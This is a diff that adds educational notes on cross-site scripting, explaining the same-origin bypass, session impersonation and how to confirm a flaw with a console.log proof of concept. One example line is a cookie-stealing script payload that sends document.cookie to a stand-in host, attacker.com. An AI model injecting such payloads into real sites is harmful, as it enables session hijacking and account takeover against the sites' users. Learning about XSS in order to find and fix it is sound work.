@@ -1,1 +1,56 @@
+It is a web security flaw that lets attackers inject malicious code into a website, compromising user interactions.
+
+Bypasses Same Origin Policy: XSS evades the security rule that keeps websites isolated, allowing attackers to access or manipulate user sessions.
+
+Masquerades as User: Attackers can impersonate victims, performing actions or stealing data the user can access.
+
+Example: An attacker injects <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script> into a comment field. 
+When a user views the comment, their session cookie is sent to the attacker’s server, letting the attacker log in as the user.
+
+High Risk for Privileged Users: If the victim has admin rights, attackers could gain full control over the application’s functionality and data.
+
+-
+
+How does XSS work?
+
+Malicious Code Injection: An attacker injects harmful JavaScript into a website’s input fields (e.g., forms, comments, or URLs) or database, 
+which runs in a user’s browser when they load the affected page.
+
+Exploits User Session: The code steals session data (like cookies) or performs actions as the user, bypassing security to access their account or data.
+
+-
+
+XSS proof of concept
+
+Can confirm most kinds of XSS vulnerability by injecting a payload that causes your own browser to execute some arbitrary JavaScript using:
+console.log() or alert()
+
+Example PoC: 
+Inject 
+
+<script>console.log("XSS PoC Success")</script> 
+
+into a vulnerable input field (e.g., a comment box, search field, or URL parameter) on the target website. 
+If the console shows "XSS PoC Success" when the page loads, the XSS is confirmed.
+
+Check console output in the browser's Developer Tools by going to the Console tab, and look for the output: "XSS PoC Success" from console.log()
+
+-
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
